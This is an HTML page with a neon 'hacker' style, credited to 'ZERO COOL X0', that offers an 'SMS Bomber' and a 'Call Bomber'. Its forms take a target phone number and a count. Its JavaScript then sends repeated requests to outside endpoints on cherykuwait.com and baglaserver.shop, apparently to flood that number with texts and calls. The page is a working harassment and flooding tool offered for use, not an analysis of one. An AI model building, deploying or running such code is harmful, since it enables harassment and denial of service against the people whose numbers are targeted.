<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Teach And Learn</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #000000, #004d00);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #00ff00;
        }
        h1, h2, h3 {
            margin: 0;
            text-align: center;
            white-space: nowrap;
        }
        h1 {
            font-size: 1.8rem;
            text-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00;
        }
        h2 {
            font-size: 1.4rem;
            text-shadow: 0 0 10px #00ff00;
        }
        h3 {
            font-size: 1.2rem;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 50px #00ff00;
            width: 350px;
            text-align: center;
        }
        input[type="text"], input[type="number"], input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #00ff00;
            border-radius: 5px;
            background: #000;
            color: #00ff00;
            font-size: 1rem;
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        button {
            background: #00ff00;
            color: #000;
            padding: 10px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
            font-size: 1rem;
            transition: all 0.4s ease;
            box-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
        }
        button:hover {
            background: #004d00;
            color: #00ff00;
            transform: scale(1.1);
            box-shadow: 0 0 50px #00ff00;
        }
        .credit {
            margin-top: 20px;
            color: #00ff00;
            font-size: 1rem;
            text-shadow: 0 0 10px #00ff00;
        }
        .credit a {
            color: #00ff00;
            text-decoration: none;
            font-weight: bold;
        }
        .credit a:hover {
            color: #004d00;
        }
        #popup {
            visibility: hidden;
            opacity: 0;
            background-color: rgba(0, 0, 0, 0.9);
            color: #00ff00;
            padding: 15px;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 10px;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 0 50px #00ff00;
            text-align: center;
        }
        #popup.show {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>

<!-- Channel Name and Presentation -->
<h1>ZERO COOL X0 ðŸ’¤</h1>
<h2>Present</h2>
<h3>BD SMS Bomber</h3>

<div class="container">
    <form id="smsForm">
        <input type="text" name="phone" id="phone" placeholder="Enter phone number" required>
        <input type="number" name="sms_count" id="sms_count" placeholder="Enter amount" required min="1" max="15">
        <button type="submit">Submit</button>
    </form>
    <div class="credit">
        <p>Credit: <a href="https://instagram.com/zero_cool_x0" target="_blank">OPURBO AHMED</a></p>
    </div>
</div>

<!-- New Section for Call Bomber -->
<div class="container" style="margin-top: 20px;">
    <h3>CALL BOOMBER ðŸ’£</h3>
    <form id="callForm">
        <input type="text" name="call_phone" id="call_phone" placeholder="Enter phone number" required>
        <button type="submit">Start Call Bombing</button>
    </form>
</div>

<!-- Pop-up message -->
<div id="popup">Bombing Start within 3 seconds</div>

<script>
    function showPopup() {
        // Show the popup
        var popup = document.getElementById('popup');
        popup.classList.add('show');
        
        // Hide the popup after 2.3 seconds
        setTimeout(function() {
            popup.classList.remove('show');
        }, 2300);
    }

    async function callAPI(phone, amount) {
        const url = `https://cherykuwait.com/topbomb.php?phone=${encodeURIComponent(phone)}&amount=${amount}`;
        try {
            const response = await fetch(url);
            const data = await response.text();
            console.log(`Response from ${url}: ${data}`);
        } catch (error) {
            console.error(`Error calling API: ${error}`);
        }
    }

    async function handleSubmit(event) {
        event.preventDefault(); // Prevent form submission

        const phone = document.getElementById('phone').value;
        const amount = parseInt(document.getElementById('sms_count').value);

        if (!phone || amount <= 0) {
            alert('Please enter a valid phone number and amount.');
            return;
        }

        showPopup(); // Show the popup

        // Call the API multiple times based on the amount
        for (let i = 0; i < amount; i++) {
            await callAPI(phone, amount);
        }

        // Show success message
        alert('APIs have been called successfully.');
    }

    async function handleCallSubmit(event) {
        event.preventDefault(); // Prevent form submission

        const phone = document.getElementById('call_phone').value;

        if (!phone) {
            alert('Please enter a valid phone number.');
            return;
        }

        showPopup(); // Show the popup

        // Call the API for call bombing
        const url = `http://baglaserver.shop/bkash.php?phone=${encodeURIComponent(phone)}`;
        try {
            const response = await fetch(url);
            const data = await response.text();
            console.log(`Response from ${url}: ${data}`);
            alert('Call bombing started successfully.');
        } catch (error) {
            console.error(`Error calling API: ${error}`);
            alert('Failed to start call bombing.');
        }
    }

    // Attach the form submission handlers
    document.getElementById('smsForm').addEventListener('submit', handleSubmit);
    document.getElementById('callForm').addEventListener('submit', handleCallSubmit);
</script>

</body>
</html>
